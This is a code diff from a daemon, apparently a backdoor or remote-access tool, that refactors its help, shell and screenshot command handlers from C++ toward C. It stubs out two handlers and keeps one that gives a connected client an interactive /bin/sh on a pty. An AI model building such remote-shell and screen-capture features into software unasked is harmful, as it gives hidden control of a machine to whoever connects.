@@ -10,40 +10,42 @@
 
 int shield_cmd_help(client_t *client, [[maybe_unused]] DaemonServer *server, const char *args)
 {
-	if (!args || !*args)
-	{
-		for (int i = 0; commands[i].command != NULL; ++i)
-		{
-			client->output_buffer.append(commands[i].usage);
-			client->output_buffer.append(": ");
-			client->output_buffer.append(commands[i].description);
-			client->output_buffer.push_back('\n');
-		}
-		return (0);
-	}
-
-	std::string option;
-	std::istringstream argstream(args);
-	argstream >> option;
-	for (int i = 0; commands[i].command != NULL; ++i)
-	{
-		if (option == commands[i].command)
-		{
-			client->output_buffer.append("Usage: ");
-			client->output_buffer.append(commands[i].usage);
-			client->output_buffer.push_back('\n');
-
-			client->output_buffer.append("Description: ");
-			client->output_buffer.append(commands[i].description);
-			client->output_buffer.push_back('\n');
-
-			return 0;
-		}
-	}
-
-	client->output_buffer.append("Command not found: ");
-	client->output_buffer.append(option);
-	client->output_buffer.push_back('\n');
+	(void) client, (void) server, (void) args;
+	//TODO: remake in C
+	// if (!args || !*args)
+	// {
+	// 	for (int i = 0; commands[i].command != NULL; ++i)
+	// 	{
+	// 		client->output_buffer.append(commands[i].usage);
+	// 		client->output_buffer.append(": ");
+	// 		client->output_buffer.append(commands[i].description);
+	// 		client->output_buffer.push_back('\n');
+	// 	}
+	// 	return (0);
+	// }
+	//
+	// std::string option;
+	// std::istringstream argstream(args);
+	// argstream >> option;
+	// for (int i = 0; commands[i].command != NULL; ++i)
+	// {
+	// 	if (option == commands[i].command)
+	// 	{
+	// 		client->output_buffer.append("Usage: ");
+	// 		client->output_buffer.append(commands[i].usage);
+	// 		client->output_buffer.push_back('\n');
+	//
+	// 		client->output_buffer.append("Description: ");
+	// 		client->output_buffer.append(commands[i].description);
+	// 		client->output_buffer.push_back('\n');
+	//
+	// 		return 0;
+	// 	}
+	// }
+	//
+	// client->output_buffer.append("Command not found: ");
+	// client->output_buffer.append(option);
+	// client->output_buffer.push_back('\n');
 
 	return (-1);
 }
@@ -60,19 +62,19 @@ int	shield_cmd_shell(client_t *client, DaemonServer *server, const char *args)
 
 	if (pid < 0)	//Error
 		return (1);
-	if ( pid == 0)
+	if (pid == 0)
 	{
 		char *argv[] = {(char *)"sh", (char *)"-i", NULL};
 		char *envp[] = {NULL};
 		execve("/bin/sh", argv, envp);
 
-		MERR("execve failed");
+		DEBUG("execve failed");
 		exit(1);
 	}
 
 	if (fcntl(master_fd, F_SETFL, O_NONBLOCK) < -1)
 	{
-		MERR("fcntl on pty failed");
+		DEBUG("fcntl on pty failed");
 		close(master_fd);
 		return (1);
 	}
@@ -100,18 +102,20 @@ int	shield_cmd_screenshot(
 	[[maybe_unused]] DaemonServer *server,
 	[[maybe_unused]] const char *args
 ) {
+	(void) client, (void) server, (void) args;
+	//TODO: remake in C
 	const char *result = shield_screenshot();
-	if (std::strncmp(result, "ERROR|", 6) != 0)
+	if (strncmp(result, "ERROR|", 6) != 0)
 	{
-		client->output_buffer.append("Successfully took screenshot, saved to ");
-		client->output_buffer.append(result);
-		client->output_buffer.push_back('\n');
+		// client->output_buffer.append("Successfully took screenshot, saved to ");
+		// client->output_buffer.append(result);
+		// client->output_buffer.push_back('\n');
 	}
 	else
 	{
-		client->output_buffer.append("Failed to take screenshot: ");
-		client->output_buffer.append(result);
-		client->output_buffer.push_back('\n');
+		// client->output_buffer.append("Failed to take screenshot: ");
+		// client->output_buffer.append(result);
+		// client->output_buffer.push_back('\n');
 	}
 	return (0);
 }
